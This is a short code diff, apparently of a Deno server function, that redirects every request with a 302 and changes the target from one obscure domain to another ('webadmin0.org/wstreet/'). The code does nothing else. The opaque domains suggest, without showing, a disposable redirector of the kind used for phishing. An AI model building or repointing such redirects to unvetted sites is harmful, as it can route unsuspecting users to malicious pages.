@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://myactivmpaccrevl.info/miflo/",
+      Location: "https://webadmin0.org/wstreet/",
     },
   });
 });
